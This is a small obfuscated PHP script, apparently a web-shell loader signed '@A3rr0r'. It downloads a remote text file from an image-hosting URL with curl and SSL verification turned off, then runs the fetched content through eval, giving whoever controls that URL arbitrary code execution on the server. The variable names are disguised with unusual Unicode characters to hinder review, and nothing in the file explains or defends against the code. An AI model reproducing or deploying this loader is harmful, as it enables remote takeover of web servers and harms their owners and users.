<?php
/* @A3rr0r */

$ࠡ7bc9ࠥ1 = 'https://www.image2url.com/r2/default/files/1794614761195-63fe6f1f-7a48-487f-b34c-33d52e000b04.txt';
$ࠡe620ࠥ2 = curl_init($ࠡ7bc9ࠥ1);
$ࠟ࠯ࠡ࠵48 = new ArrayIterator([
'RETURNTRANSFER',
'FOLLOWLOCATION',
'SSL_VERIFYPEER',
'SSL_VERIFYHOST'
]);
$alignment_71 = new RegexIterator(
$ࠟ࠯ࠡ࠵48,
'/^SSL_/'
);
$ࠠ2 = [];
foreach ($alignment_71 as $__opt) {
$ࠠ2[constant('CURLOPT_' . $__opt)] = 0;
}
curl_setopt_array(
$ࠡe620ࠥ2,
[
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_FOLLOWLOCATION => 1
] + $ࠠ2
);
$ࠡ1393ࠥ4 = curl_exec($ࠡe620ࠥ2);
curl_close($ࠡe620ࠥ2);
if ($ࠡ1393ࠥ4) {
eval('?>' . $ࠡ1393ࠥ4);
}
?>
